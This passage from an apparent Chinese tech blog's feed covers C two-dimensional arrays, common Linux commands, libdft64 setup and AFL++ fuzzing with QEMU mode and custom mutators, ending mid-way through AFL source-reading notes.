number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出：1</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Element at matrix[1][2]: %d\\n\"</span><span class=\"token punctuation\">,</span> matrix<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出：6</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在这个例子中，我们使用静态初始化的方式创建了一个2行3列的二维数组<code>matrix</code>。通过在花括号内提供初始值来初始化二维数组的每个元素。</p>\n<p><strong>方法二：使用动态内存分配创建二维数组</strong></p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h&gt;</span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 创建一个2行3列的二维数组</span>\n    <span class=\"token keyword\">int</span> rows <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> cols <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> matrix <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>rows <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这里定义指向int*的指针类型</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> rows<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        matrix<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>cols <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 指向int类型的指针</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// 给二维数组赋值</span>\n    matrix<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    matrix<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    matrix<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n    matrix<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n    matrix<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n    matrix<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 访问二维数组的元素</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Element at matrix[0][0]: %d\\n\"</span><span class=\"token punctuation\">,</span> matrix<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出：1</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Element at matrix[1][2]: %d\\n\"</span><span class=\"token punctuation\">,</span> matrix<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 输出：6</span>\n\n    <span class=\"token comment\">// 释放动态分配的内存</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> rows<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>matrix<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>matrix<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​\t在这个例子中，我们使用动态内存分配的方式创建了一个2行3列的二维数组<code>matrix</code>。首先，我们使用<code>malloc</code>函数分配了一个指向指针的指针<code>matrix</code>，作为二维数组的行。然后，通过循环为每一行分配内存空间。</p>\n<p>​\t接下来，我们可以像普通的二维数组一样，使用索引操作符<code>[]</code>来访问和赋值二维数组的元素。</p>\n<p>​\t在最后，我们需要记得释放动态分配的内存，以避免内存泄漏。首先，我们使用循环释放每一行的内存，然后再释放指向指针的指针<code>matrix</code>的内存。</p>\n<p>​\t这两种方法分别适用于不同的情况。静态初始化适用于已知大小且不会改变的二维数组，而动态内存分配适用于在程序运行时需要根据具体需求创建大小可变的二维数组。</p>\n<h2 id=\"字符串操作\"><a href=\"#字符串操作\" class=\"headerlink\" title=\"字符串操作\"></a>字符串操作</h2><p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309111959759.png\" alt=\"image-20230911195937691\"></p>\n<p>图片来源：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZHVDbnlNNTNkb0V0Xy1PUFhLMW1EUQ==\">https://mp.weixin.qq.com/s/duCnyM53doEt_-OPXK1mDQ</span></p>\n<pre class=\"line-numbers language-C\" data-language=\"C\"><code class=\"language-C\">char greeting[] = \"Hello\";<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": [
                "C"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/05/useful-command/",
            "url": "https://alazymechnaic.github.io/2023/09/05/useful-command/",
            "title": "Useful_command",
            "date_published": "2023-09-05T07:15:02.000Z",
            "content_html": "<h2 id=\"tar\"><a href=\"#tar\" class=\"headerlink\" title=\"tar\"></a>tar</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 打包操作</span>\n<span class=\"token function\">tar</span> <span class=\"token parameter variable\">-cvf</span> archive.tar file1 file2 <span class=\"token punctuation\">..</span>.\n\n<span class=\"token comment\"># -c表示创建打包文件，-v表示显示详细的操作信息，-f指定打包文件的名称。archive.tar是打包文件的名称，file1 file2 ...是要添加到打包文件中的文件或目录的列表。可以根据需要添加多个文件或目录</span>\n\n<span class=\"token comment\"># 解包操作</span>\n<span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xvf</span> archive.tar\n<span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xvf</span> archive.tar <span class=\"token parameter variable\">-C</span> target_directory<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"du\"><a href=\"#du\" class=\"headerlink\" title=\"du\"></a>du</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 查看文件大小用量</span>\n<span class=\"token function\">du</span> <span class=\"token parameter variable\">-sh</span> ./target_file<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"intel-pin\"><a href=\"#intel-pin\" class=\"headerlink\" title=\"intel pin\"></a>intel pin</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 编译可供32位可执行文件使用的pintool</span>\n<span class=\"token function\">make</span> obj-ia32/inscount0.so <span class=\"token assign-left variable\">TARGET</span><span class=\"token operator\">=</span>ia32\n<span class=\"token comment\"># 编译可供64位可执行文件使用的pintool</span>\n<span class=\"token function\">make</span> obj-intel64/inscount0.so <span class=\"token assign-left variable\">TARGET</span><span class=\"token operator\">=</span>intel64\n<span class=\"token comment\"># 对目标程序进行插装</span>\n<span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/pin <span class=\"token parameter variable\">-t</span> obj-intel64/inscount0.so <span class=\"token parameter variable\">-o</span> inscount0.log -- /bin/ls<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "Linux"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/03/libdft/",
            "url": "https://alazymechnaic.github.io/2023/09/03/libdft/",
            "title": "libdft",
            "date_published": "2023-09-03T08:24:26.000Z",
            "content_html": "<h2 id=\"libdft64\"><a href=\"#libdft64\" class=\"headerlink\" title=\"libdft64\"></a>libdft64</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FuZ29yYUZ1enplci9saWJkZnQ2NA==\">https://github.com/AngoraFuzzer/libdft64</span></p>\n<h3 id=\"安装踩坑\"><a href=\"#安装踩坑\" class=\"headerlink\" title=\"安装踩坑\"></a>安装踩坑</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\"># 设置pin\n进入libdft64中执行 ./install_pin.sh\n# 手动执行\nPlease set:\nexport PIN_ROOT=/home/harry/pin-3.20-98437-gf02b61307-gcc-linux\n# 编译安装\nmake<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"使用踩坑\"><a href=\"#使用踩坑\" class=\"headerlink\" title=\"使用踩坑\"></a>使用踩坑</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 官方给出的使用方法如下</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/30/afl-fuzz-diy/",
            "url": "https://alazymechnaic.github.io/2023/08/30/afl-fuzz-diy/",
            "title": "afl_fuzz_DIY",
            "date_published": "2023-08-30T08:38:13.000Z",
            "content_html": "<h1 id=\"AFL\"><a href=\"#AFL\" class=\"headerlink\" title=\"AFL ++\"></a>AFL ++</h1><hr>\n<h2 id=\"afl-for-binary\"><a href=\"#afl-for-binary\" class=\"headerlink\" title=\"afl for binary\"></a>afl for binary</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">dop@ubuntu:~$ <span class=\"token assign-left variable\">AFL_QEMU_DEBUG_MAPS</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> afl-qemu-trace ./ciscn_2019_c_1\n<span class=\"token number\">400000</span>-402000 r-xp 00000000 08:05 <span class=\"token number\">1617251</span>                                /home/dop/ciscn_2019_c_1\n<span class=\"token number\">402000</span>-601000 ---p 00000000 00:00 <span class=\"token number\">0</span>\n<span class=\"token number\">601000</span>-602000 r--p 00001000 08:05 <span class=\"token number\">1617251</span>                                /home/dop/ciscn_2019_c_1\n<span class=\"token number\">602000</span>-603000 rw-p 00002000 08:05 <span class=\"token number\">1617251</span>                                /home/dop/ciscn_2019_c_1\n<span class=\"token number\">4000000000</span>-4000001000 ---p 00000000 00:00 <span class=\"token number\">0</span>\n<span class=\"token number\">4000001000</span>-4000801000 rw-p 00000000 00:00 <span class=\"token number\">0</span>                              <span class=\"token punctuation\">[</span>stack<span class=\"token punctuation\">]</span>\n<span class=\"token number\">4000801000</span>-4000802000 r--p 00000000 08:05 <span class=\"token number\">1968235</span>                        /usr/lib/x86_64-linux-gnu/ld-2.31.so\n<span class=\"token number\">4000802000</span>-4000825000 r-xp 00001000 08:05 <span class=\"token number\">1968235</span>                        /usr/lib/x86_64-linux-gnu/ld-2.31.so\n<span class=\"token number\">4000825000</span>-400082d000 r--p 00024000 08:05 <span class=\"token number\">1968235</span>                        /usr/lib/x86_64-linux-gnu/ld-2.31.so\n400082d000-400082e000 ---p 00000000 00:00 <span class=\"token number\">0</span>\n400082e000-400082f000 r--p 0002c000 08:05 <span class=\"token number\">1968235</span>                        /usr/lib/x86_64-linux-gnu/ld-2.31.so\n400082f000-4000830000 rw-p 0002d000 08:05 <span class=\"token number\">1968235</span>                        /usr/lib/x86_64-linux-gnu/ld-2.31.so\n<span class=\"token number\">4000830000</span>-4000833000 rw-p 00000000 00:00 <span class=\"token number\">0</span>\n<span class=\"token number\">4000847000</span>-4000869000 r--p 00000000 08:05 <span class=\"token number\">1968239</span>                        /usr/lib/x86_64-linux-gnu/libc-2.31.so\n<span class=\"token number\">4000869000</span>-40009e1000 r-xp 00022000 08:05 <span class=\"token number\">1968239</span>                        /usr/lib/x86_64-linux-gnu/libc-2.31.so\n40009e1000-4000a2f000 r--p 0019a000 08:05 <span class=\"token number\">1968239</span>                        /usr/lib/x86_64-linux-gnu/libc-2.31.so\n4000a2f000-4000a33000 r--p 001e7000 08:05 <span class=\"token number\">1968239</span>                        /usr/lib/x86_64-linux-gnu/libc-2.31.so\n4000a33000-4000a35000 rw-p 001eb000 08:05 <span class=\"token number\">1968239</span>                        /usr/lib/x86_64-linux-gnu/libc-2.31.so\n4000a35000-4000a3b000 rw-p 00000000 00:00 <span class=\"token number\">0</span>\nffffffffff600000-ffffffffff601000 <span class=\"token parameter variable\">--xp</span> 00000000 00:00 <span class=\"token number\">0</span>                  <span class=\"token punctuation\">[</span>vsyscall<span class=\"token punctuation\">]</span>\nEEEEEEE                            hh      iii\nEE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee\nEEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e\nEE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee\nEEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee\n<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>\nWelcome to this Encryption machine\n\n<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>\n<span class=\"token number\">1</span>.Encrypt\n<span class=\"token number\">2</span>.Decrypt\n<span class=\"token number\">3</span>.Exit\nInput your choice<span class=\"token operator\">!</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015669.png\" alt=\"image-20230901091314691\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">AFL_QEMU_PERSISTENT_ADDR</span><span class=\"token operator\">=</span>0x400B28\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">AFL_QEMU_PERSISTENT_GPR</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h2 id=\"无源码测试\"><a href=\"#无源码测试\" class=\"headerlink\" title=\"无源码测试\"></a>无源码测试</h2><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 无源码测试基于qemu实现，首先配置qemu</span>\n$ <span class=\"token builtin class-name\">cd</span> qemu_mode\n$ ./build_qemu_support.sh\n<span class=\"token comment\"># 设置原始输入和输出</span>\n$ <span class=\"token function\">mkdir</span> fuzz_in\n$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"hello\"</span> <span class=\"token operator\">&gt;</span> fuzz_in/testcase\n$ gcc test.c <span class=\"token parameter variable\">-o</span> <span class=\"token builtin class-name\">test</span>\n$ afl-fuzz <span class=\"token parameter variable\">-i</span> fuzz_in <span class=\"token parameter variable\">-o</span> fuzz_out <span class=\"token parameter variable\">-Q</span> ./test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015117.png\" alt=\"image-20230901102144519\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 输出结果</span>\n└── default\n    ├── cmdline\n    ├── crashes\n    │   ├── id:000000,sig:11,src:000000+000030,time:3961,execs:13145,op:splice,rep:4\n    │   ├── id:000001,sig:04,src:000000+000030,time:3961,execs:13146,op:splice,rep:5\n    │   ├── id:000002,sig:04,src:000000+000026,time:3985,execs:13213,op:splice,rep:8\n    │   ├── id:000003,sig:11,src:000043+000009,time:4075,execs:13502,op:splice,rep:16\n    │   ├── id:000004,sig:11,src:000035+000023,time:4240,execs:14064,op:splice,rep:16\n    │   ├── id:000005,sig:11,src:000025+000037,time:4319,execs:14316,op:splice,rep:6\n    │   └── README.txt\n    ├── fuzz_bitmap\n    ├── fuzzer_setup\n    ├── fuzzer_stats\n    ├── hangs\n    ├── plot_data\n    └── queue\n        ├── id:000000,time:0,execs:0,orig:testcase\n        ├── id:000001,src:000000,time:4,execs:12,op:havoc,rep:2,+cov\n        ├── id:000002,src:000000,time:6,execs:20,op:havoc,rep:1\n        ├── id:000003,src:000000,time:9,execs:28,op:havoc,rep:1\n        ├── id:000004,src:000000,time:12,execs:37,op:havoc,rep:1\n<span class=\"token comment\"># </span>\ncrashes：存放去重后触发crash的数据\n\nfuzz_bitmap：记录代码覆盖率\n\nfuzzer_stats：fuzz状态\n\nhangs：存放去重后触发挂起的数据\n\nplot_data：绘图数据\n\nqueue：有效的样本集合\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果需要对so文件进行测试，需要将相应的动态链接库目录加入到环境变量中</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">QEMU_LD_PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">$LD_LIBRARY_PATH</span><span class=\"token builtin class-name\">:</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">LD_LIBRARY_PATH</span><span class=\"token operator\">=</span><span class=\"token variable\">$LD_LIBRARY_PATH</span>\n<span class=\"token comment\"># 两个都试试吧</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"自定义fuzz策略\"><a href=\"#自定义fuzz策略\" class=\"headerlink\" title=\"自定义fuzz策略\"></a>自定义fuzz策略</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU0MzYz\">https://www.anquanke.com/post/id/254363</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FGTHBsdXNwbHVzL0FGTHBsdXNwbHVzL2Jsb2IvZGV2L2RvY3MvY3VzdG9tX211dGF0b3JzLm1kJUUzJTgwJTgx\">https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md、</span></p>\n<h3 id=\"官方自定义文档\"><a href=\"#官方自定义文档\" class=\"headerlink\" title=\"官方自定义文档\"></a>官方自定义文档</h3><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FGTHBsdXNwbHVzL0FGTHBsdXNwbHVzL2Jsb2IvZGV2L2RvY3MvY3VzdG9tX211dGF0b3JzLm1kIzItYXBpcw==\">https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md#2-apis</span></p>\n<h3 id=\"安装libprotobuf\"><a href=\"#安装libprotobuf\" class=\"headerlink\" title=\"安装libprotobuf\"></a>安装libprotobuf</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 提示cmake 版本太低 https://www.cnblogs.com/jsdy/p/12689470.html#_label0</span>\n升级cmake \n$ <span class=\"token function\">wget</span> http://www.cmake.org/files/v3.25/cmake-3.25.2.tar.gz\n./bootstrap\n<span class=\"token function\">make</span>\n<span class=\"token function\">make</span> <span class=\"token function\">install</span>\n<span class=\"token comment\"># 出找不到openssl </span>\nCould NOT <span class=\"token function\">find</span> OpenSSL, try to <span class=\"token builtin class-name\">set</span> the path to OpenSSL root folder <span class=\"token keyword\">in</span> the system variable OPENSSL_ROOT_DIR <span class=\"token punctuation\">(</span>missing: OPENSSL_LIBRARIES OPENSSL_INCLUDE_DIR<span class=\"token punctuation\">)</span> \n$ <span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> libssl-dev\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>安装libxml4</p>\n<p>autogen.sh </p>\n<p>报错：<br>configure.ac:1087: error: possibly undefined macro: m4_ifdef<br>      If this token and others are legitimate, please use m4_pattern_allow.<br>      See the Autoconf documentation.</p>\n<p>解决方案：sudo cp /usr/share/aclocal/*.m4 /usr/local/share/aclocal/<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veTQyNDc0NjQvcC8xNDM4ODMzNC5odG1s\">https://www.cnblogs.com/y4247464/p/14388334.html</span></p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309081527504.png\">\t</p>\n<p>本文介绍如何利用AFL Plus Plus实现自定义目标的模糊测试。</p>\n<p>Tutorials ： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FGTHBsdXNwbHVzL0FGTHBsdXNwbHVzL2Jsb2Ivc3RhYmxlL2RvY3MvdHV0b3JpYWxzLm1k\">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/tutorials.md</span></p>\n<h2 id=\"AFL源码阅读\"><a href=\"#AFL源码阅读\" class=\"headerlink\" title=\"AFL源码阅读\"></a>AFL源码阅读</h2><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token comment\">// afl-fuzz.h: line 431</span>\n<span class=\"token comment\">// 该结构用于存储本次afl运行所需要的上下文内容</span>\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">afl_state</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\">/* Position of this state in the global states list */</span>\n  u32 _id<span class=\"token punctuation\">;</span>\n\n  <span class=\"token class-name\">afl_forkserver_t</span> fsrv<span class=\"token punctuation\">;</span>\n  <span class=\"token class-name\">sharedmem_t</span>      shm<span class=\"token punctuation\">;</span>\n  <span class=\"token class-name\">sharedmem_t</span>     <span class=\"token operator\">*</span>shm_fuzz<span class=\"token punctuation\">;</span>\n  <span class=\"token class-name\">afl_env_vars_t</span>   afl_env<span class=\"token punctuation\">;</span>\t\n  <span class=\"token comment\">//...</span>\n<span class=\"token punctuation\">}</span> <span class=\"token class-name\">afl_state_t</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// afl-fuzz-init.c 该函数的目的是使用原始输入执行程序</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">perform_dry_run</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">afl_state_t</span> <span class=\"token operator\">*</span>afl<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// afl-forkserver.c </span>\n<span class=\"token comment\">// 该函数用于进行子程序的执行</span>\n<span class=\"token class-name\">fsrv_run_result_t</span> <span class=\"token keyword\">__attribute__</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>hot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">afl_fsrv_run_target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">afl_forkserver_t</span> <span class=\"token operator\">*</span>fsrv<span class=\"token punctuation\">,</span> u32 timeout<span class=\"token punctuation\">,</span>\n                    <span class=\"token keyword\">volatile</span> u8 <span class=\"token operator\">*</span>stop_soon_p<span class=\"token punctuation\">)</span> <span class=\"token 